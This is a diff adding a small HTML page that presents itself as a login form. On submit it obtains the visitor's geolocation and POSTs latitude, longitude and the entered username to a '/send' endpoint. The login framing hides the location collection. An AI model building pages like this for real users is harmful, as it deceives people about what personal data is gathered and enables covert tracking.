@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Login Page</title>
+  </head>
+  <body>
+    <h1>Login Form</h1>
+    <form >
+      <div class="container">
+        <label>Username : </label>
+        <input
+          id="username"
+          type="text"
+          placeholder="Enter Username"
+          name="username"
+          required
+        />
+        <button type="submit" onclick="getLocation()">Submit</button>
+        <p id="demo"></p>
+      </div>
+      </form>
+
+      <script>
+        // on click triggers getlocation function which uses googles geolocation api to find users position and passes it to function boom
+        function getLocation() {
+          if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(boom);
+          } else { 
+            document.getElementById("demo").innerHTML = "Geolocation is not supported by this browser.";
+          }
+        };
+        // boom function makes a JSON object which contains latitude and longitude using the position and entered username using jquery
+        function boom(position){
+            const URL = '/send'
+            const data = {
+            "lat": position.coords.latitude,
+            "lng": position.coords.longitude,
+             "user": document.getElementById("username").value
+            };
+            // make a post request of json object to url "/send"
+            fetch(URL, {
+            method: "POST",
+            body: JSON.stringify(data),
+            headers: {
+                "Content-type": "application/json; charset=UTF-8"
+            }
+            })
+        };
+        
+            </script>
+
+  </body>
+</html>
